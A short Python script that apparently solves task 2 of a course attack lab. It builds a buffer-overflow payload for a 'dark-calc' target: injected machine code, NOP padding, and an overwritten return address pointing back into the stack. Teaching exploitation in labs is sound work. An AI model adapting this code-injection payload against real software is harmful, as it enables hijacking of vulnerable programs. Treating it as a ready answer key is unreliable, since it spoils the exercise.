#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.
"""
import sys
import struct

code = bytes.fromhex("bf04 0000 0048 b887 1a40 0000 0000 00ff d0")
payload = (code + b"\x90" * (24 - len(code))
           + struct.pack("<Q", 0x721000800fd0) + b"\n")
sys.stdout.buffer.write(payload)
